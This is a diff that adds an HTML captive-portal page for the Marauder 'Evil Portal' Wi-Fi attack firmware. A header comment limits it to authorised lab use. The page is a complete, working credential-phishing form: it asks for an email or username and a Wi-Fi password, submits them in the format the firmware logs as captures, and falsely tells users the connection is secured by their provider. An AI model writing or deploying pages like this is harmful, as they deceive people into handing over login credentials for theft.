@@ -1,0 +1,49 @@
+<!doctype html>
+<!-- Marauder Evil Portal captive page.
+     FOR AUTHORIZED SECURITY TESTING / LAB USE ON NETWORKS YOU OWN ONLY.
+     Generic (no real brand) on purpose: imitating a real ISP/company would be
+     real phishing. The form MUST GET /get with the firmware's param names
+     (email, password) or EvilPortal.cpp never logs a capture. Keep it ASCII and
+     under MAX_HTML_SIZE (11400 bytes on this no-PSRAM board). -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Wi-Fi Network Login</title>
+<style>
+  :root{--bg:#0f1420;--card:#171e2e;--fg:#eef2f8;--mut:#9aa6bd;--acc:#2f81f7;--line:#27304a}
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+       background:var(--bg);color:var(--fg);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+  .card{width:100%;max-width:360px;margin:16px;background:var(--card);border:1px solid var(--line);
+        border-radius:14px;padding:26px 22px;box-shadow:0 10px 40px rgba(0,0,0,.45)}
+  .logo{width:44px;height:44px;border-radius:10px;background:var(--acc);margin:0 auto 14px;
+        display:flex;align-items:center;justify-content:center;font-size:24px}
+  h1{font-size:19px;margin:0 0 4px;text-align:center}
+  p.sub{margin:0 0 20px;text-align:center;color:var(--mut);font-size:13px;line-height:1.4}
+  label{display:block;font-size:12px;color:var(--mut);margin:14px 0 6px}
+  input{width:100%;padding:11px 12px;border-radius:9px;border:1px solid var(--line);
+        background:#0f1626;color:var(--fg);font-size:15px}
+  input:focus{outline:none;border-color:var(--acc)}
+  button{width:100%;margin-top:20px;padding:12px;border:0;border-radius:9px;background:var(--acc);
+         color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+  button:active{opacity:.85}
+  .foot{margin-top:16px;text-align:center;color:var(--mut);font-size:11px;line-height:1.5}
+</style>
+</head>
+<body>
+  <main class="card">
+    <div class="logo">&#128246;</div>
+    <h1>Network Sign-In Required</h1>
+    <p class="sub">To continue to the internet, please verify your access to this Wi-Fi network.</p>
+    <form action="/get" method="get" autocomplete="off">
+      <label for="email">Email or Username</label>
+      <input id="email" name="email" type="text" inputmode="email" placeholder="you@example.com" required>
+      <label for="password">Wi-Fi Password</label>
+      <input id="password" name="password" type="password" placeholder="Network password" required>
+      <button type="submit">Connect</button>
+    </form>
+    <p class="foot">Authorized lab testing only &middot; connection secured by your network provider</p>
+  </main>
+</body>
+</html>
